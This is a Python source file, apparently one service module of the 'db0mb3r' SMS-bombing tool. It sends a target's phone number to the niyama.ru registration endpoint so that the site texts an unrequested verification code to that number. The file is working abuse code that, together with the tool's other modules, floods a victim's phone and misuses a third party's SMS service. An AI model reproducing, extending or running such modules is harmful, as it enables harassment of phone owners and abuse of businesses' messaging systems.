from db0mb3r.services.service import Service


class Niyama(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://www.niyama.ru/ajax/sendSMS.php",
            data={
                "REGISTER[PERSONAL_PHONE]": self.formatted_phone,
                "code": "",
                "sendsms": "Выслать код",
            },
        )
